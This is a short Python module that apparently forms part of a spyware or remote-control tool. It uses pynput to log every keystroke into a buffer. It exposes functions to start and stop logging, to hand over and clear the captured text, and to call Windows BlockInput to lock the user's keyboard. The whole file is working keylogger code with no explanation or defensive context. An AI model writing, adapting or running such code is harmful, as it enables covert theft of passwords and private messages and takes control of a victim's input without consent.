from pynput.keyboard import Listener, Key
from ctypes import windll

key_log = ''
listener = None

def on_press(key):
    global key_log

    try:
        key_log += key.char
    except AttributeError:
        if key == Key.enter:
            key_log += 'Enter\n'


def listening_keyboard(listening=True):
    global key_log
    global listener

    if listening:
        listener = Listener(on_press=on_press)
        listener.start()
    else:
        if listener:
            listener.stop()
        key_log = ''


def get_key_log():
    global key_log

    result = key_log
    key_log = ''

    return result

def set_block_keyboard(block):
    return windll.user32.BlockInput(block)
